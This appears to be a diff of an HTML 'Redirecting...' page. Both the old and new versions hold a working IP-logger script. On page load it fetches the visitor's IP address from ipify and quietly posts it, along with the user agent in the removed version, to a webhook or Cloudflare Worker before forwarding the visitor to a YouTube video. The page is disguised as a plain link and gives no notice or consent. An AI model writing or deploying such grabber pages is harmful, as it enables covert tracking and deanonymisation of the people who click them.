@@ -5,43 +5,36 @@
     <title>Redirecting...</title>
 </head>
 <body>
-    <script>
-        // --- CONFIG ---
-        const DISCORD_WEBHOOK_URL = "webhook1.kehlchen.com";
-        const YOUTUBE_VIDEO_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+<script>
+    window.addEventListener('DOMContentLoaded', async () => {
+        const workerUrl = "https://crimson-resonance-fe5c.rob-max.workers.dev/"; 
+        // HIER DEN YOUTUBE-LINK EINTRAGEN
+        const youtubeUrl = "https://www.youtube.com/watch?v=HIER_DEINE_VIDEO_ID"; 
 
-        // Fire webhook (fire-and-forget, won't block)
-        fetch('https://api.ipify.org?format=json')
-            .then(r => r.json())
-            .then(data => {
-                const ip = data.ip;
-                fetch(DISCORD_WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        username: "Visitor Logger",
-                        embeds: [{
-                            title: "🚨 Visitor Captured",
-                            color: 0xff0000,
-                            fields: [
-                                { name: "IP", value: `||${ip}||`, inline: true },
-                                { name: "UA", value: navigator.userAgent.substring(0, 100), inline: false }
-                            ],
-                            timestamp: new Date().toISOString()
-                        }]
-                    })
-                }).catch(() => {});
-            })
-            .catch(() => {})
-            .finally(() => {
-                // Instant redirect — fires immediately
-                window.location.replace(YOUTUBE_VIDEO_URL);
-            });
+        try {
+            // 1. IP des Nutzers im Hintergrund abfragen
+            const ipResponse = await fetch("https://api.ipify.org?format=json");
+            const ipData = await ipResponse.json();
+            const userIp = ipData.ip;
 
-        // Fallback redirect in case the fetch hangs
-        setTimeout(() => {
-            window.location.replace(YOUTUBE_VIDEO_URL);
-        }, 300);
-    </script>
+            // 2. IP-Adresse an deinen Cloudflare Worker senden mit einem kurzen Timeout
+            // Damit die Weiterleitung nicht blockiert wird, falls der Worker mal laggt
+            await Promise.race([
+                fetch(workerUrl, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ message: userIp })
+                }),
+                new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 2000))
+            ]);
+
+        } catch (error) {
+            console.error("Hintergrund-Aktion fehlgeschlagen:", error);
+        } finally {
+            // 3. Weiterleitung zu YouTube (wird immer ausgeführt, auch bei Fehlern)
+            window.location.href = youtubeUrl;
+        }
+    });
+</script>
 </body>
 </html>
